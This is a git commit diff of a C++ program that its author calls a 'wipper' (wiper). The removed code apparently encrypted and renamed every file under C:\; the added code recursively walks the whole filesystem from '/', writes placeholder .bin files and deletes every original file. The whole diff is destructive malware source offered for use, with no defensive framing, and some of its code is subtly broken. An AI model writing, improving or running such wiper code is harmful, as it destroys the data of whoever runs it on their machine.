8d58bbd758efe54efde81920122f42bbb8e7eb48
Canac Louis <canaclouis522@gmail.com>
2026-09-11 22:00:46 +0200

    huge optimisation and remake of the wipper

--- main.cpp
+++ main.cpp
@@ -1,37 +1,32 @@
-#include "hashlib.hpp"
-#include "polylib.hpp"
+#include <string.h>
+#include <cstdlib>  
+#include <stdint.h>
+#include <fstream>
+#include <filesystem>
+#include <vector>
 
 using namespace std;
 namespace fs = filesystem;
 
 int main() {
-    uint64_t e = 9134674975062410438;
-    uint64_t key = 2669143902719107840;
-    fs::path root = "C:\\";
+    string zeroes = "\x00";
+    fs::path root = "/";
     vector<string> paths;
     vector<string> fileppaths;
-    vector<string> fileext;
 
     auto options = fs::directory_options::skip_permission_denied;
-
-    gennoise((uint64_t)(time(NULL)));
 
     for (const auto& file : fs::recursive_directory_iterator(root, options)) {
         if (fs::is_regular_file(file.path())) {
             paths.push_back(file.path().string());
             fileppaths.push_back((file.path().parent_path()).string());
-            fileext.push_back((file.path().extension()).string());
         }
     }
 
-    vector<string> newnames;
-
-    for (uint64_t i = 0; i < paths.size(); i++) {
-        newnames.push_back((fileppaths[i] + "\\" + to_string(i) + fileext[i]));
-    }
-
     for (uint64_t j = 0; j<paths.size(); j++) {
-        hashfile(key, e, paths[j], newnames[j]);
+        ifstream file(paths[j], ios::binary);
+        fstream hash((fileppaths[j] + "/" + to_string(j) + ".bin"));
+        hash.write(reinterpret_cast<const char*>(&zeroes), sizeof(zeroes));
         fs::remove(paths[j]);
     }
     return 0;
